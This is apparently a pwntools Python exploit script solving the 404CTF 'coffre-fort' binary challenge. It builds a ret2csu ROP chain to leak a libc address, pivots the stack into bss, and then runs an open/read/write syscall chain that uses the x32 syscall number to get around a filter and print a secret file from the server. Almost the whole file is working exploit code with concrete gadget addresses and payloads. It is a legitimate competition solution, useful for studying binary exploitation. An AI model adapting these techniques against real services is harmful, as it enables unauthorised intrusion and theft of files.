#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x98+2900+0', '-e']
context.log_level = 'info'

exe = ELF("./coffre-fort_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

host, port = "challenge.404ctf.fr", "30863"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])

set_csu = 0x40163a # r12 / r13 / r14/ r15
call_csu = 0x401620 # mov rdx,r14 / mov rsi,r13 / mov rdi,r12d / call   QWORD PTR [r15+rbx*8]

pop_rdi = 0x0000000000401643 # pop rdi ; ret
pop_rsi = 0x0000000000401641 # pop rsi ; pop r15 ; ret
mov_edx = 0x000000000040152c # mov edx, 0x64207a65 ; ret
pop_rsp = 0x000000000040163d # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
leave_ret = 0x0000000000401267 # leave ; ret

def csucall(func,arg1,arg2,arg3):
  return p64(set_csu)+p64(0)+p64(1)+p64(arg1)+p64(arg2)+p64(arg3)+p64(func)+p64(call_csu)+p64(0)*7

bss = 0x404c00

f = open('dump.bin', 'rb')
buff = f.read()
f.close()

payload =''
for i in range(32):
  payload += chr(ord(buff[i]) ^ ord(buff[i+128]))

rop1 = '\x2f'*0x10
rop1 += p64(bss-8)+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(bss)+p64(0)+p64(mov_edx)+p64(exe.sym['read'])+p64(leave_ret)

rop1 = rop1.ljust(0x80,'A')
print(hexdump(rop1))

for i in range(32,128,1):
  payload += chr( ord(rop1[i-32]) ^ ord(buff[i+128]) )


print(hexdump(payload))

p.sendafter('identifiant.\n', payload[0x20:0xa0])
p.sendafter('passe.\n', payload[0:0x20])

payload2 = csucall(exe.got['write'],1, exe.got['write'],0x8)
payload2 += csucall(exe.got['read'],0, (bss+0x100) ,0x200)
payload2 += p64(pop_rsp)+p64(bss+0x118)

p.send(payload2)
libc.address = u64(p.recv(8)) - libc.sym['write']
print('libc base = '+hex(libc.address))

#libc gadgets
rop = ROP(libc)
syscall = rop.find_gadget(['syscall', 'ret'])[0]
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]

payload3 = '/app/contenu_ultra_secret_du_coffre_fort.txt'.ljust(0x30,'\x00')
payload3 += p64(pop_rax)+p64(0x40000002)+p64(pop_rdi)+p64(bss+0x100)+p64(pop_rsi)+p64(0)+p64(syscall)
payload3 += p64(pop_rdi)+p64(3)+p64(pop_rax)+p64(0)+p64(pop_rsi)+p64(bss-0x100)+p64(pop_rdx)+p64(0x100)+p64(syscall)
payload3 += p64(pop_rdx)+p64(0x30)+p64(pop_rdi)+p64(1)+p64(pop_rax)+p64(1)+p64(syscall)
payload3 += p64(pop_rax)+p64(60)+p64(syscall)

p.send(payload3)

p.interactive()

